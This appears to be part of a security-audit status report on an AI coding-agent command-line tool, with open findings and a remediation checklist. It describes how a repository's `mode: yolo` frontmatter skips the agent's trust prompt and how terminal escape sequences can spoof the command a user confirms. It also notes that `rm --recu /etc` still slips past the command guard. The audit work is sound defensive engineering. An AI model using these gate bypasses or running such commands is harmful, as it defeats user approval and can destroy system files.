1. **Custom-command `mode:` is ungated (CRITICAL).** `gate_custom_shell` is guarded by
   `if ex.shell`, so a repo's `mode: yolo` frontmatter takes the `else` arm straight into
   `run_nl` → the agentic loop, with no trust prompt. Verified end-to-end against a fake
   provider. `mode: auto` is the same escalation, one notch weaker. *This is arguably
   in-scope for audit finding #3 and should be fixed next.*
2. **Terminal control chars in the confirm prompt.** `gate_custom_shell` prints the
   resolved command unsanitized; `\r` + `ESC[2K` repaints the line so the user reads a
   different command than the one that runs.
3. **Project skills still shadow user skills.** `src/skills.rs` `load_dir` uses `insert`,
   with no origin/trust — the exact defect T4.4 fixed for commands.
4. **Drainer memory is unbounded.** The UTF-8 fix is correct, but `collected` has no cap;
   `CAPTURE_TRUNCATE_CHARS` applies only after the whole stream is in RAM.
5. **`.lines()` decode-termination survives elsewhere:** `src/mcp.rs` (stdio transport
   dies, then blocks) and `src/providers/mod.rs::read_sse` (silent mid-answer truncation).
6. **`src/dispatcher.rs::run_with_timeout` never drains** its piped stdout → a >64KB zsh
   startup output deadlocks until the 2s timeout.

---

## Master checklist (roll-up)

- [x] **Task 1** — head canonicalization (T1.1–T1.5) · *checklist done, finding NOT closed → Task 6*
- [x] **Task 2** — `rm -r` without `-f` (T2.1–T2.5) · *checklist done, `rm --recu /etc` still open → T6.6*
- [x] **Task 3** — interpreter/`eval`/`xargs` recursion (T3.1–T3.13) · *checklist done, finding NOT closed → Task 6*
- [x] **Task 4** — custom-command shell gate (T4.1–T4.9) · *`shell:true` gated; `mode:` escalation still open*
- [x] **Task 5** — byte-oriented drainer (T5.1–T5.3) · verified: `drainer_survives_invalid_utf8` passes
- [x] **Validation** — V1–V8 · fmt/clippy/release clean, 317 pass / 11 environmental, no new deps
- [ ] **Task 6** — fixed-point head resolution (T6.1–T6.11) · **blocks "audit closed"**

> **Status: the plan's checkboxes are complete; the audit is not.** Tasks 1–5 shipped
> exactly what was specified and every acceptance command passes — but an adversarial
> re-read of the *findings* shows the specified fixes were too shallow. Task 6 is the
> difference between "plan done" and "audit closed".
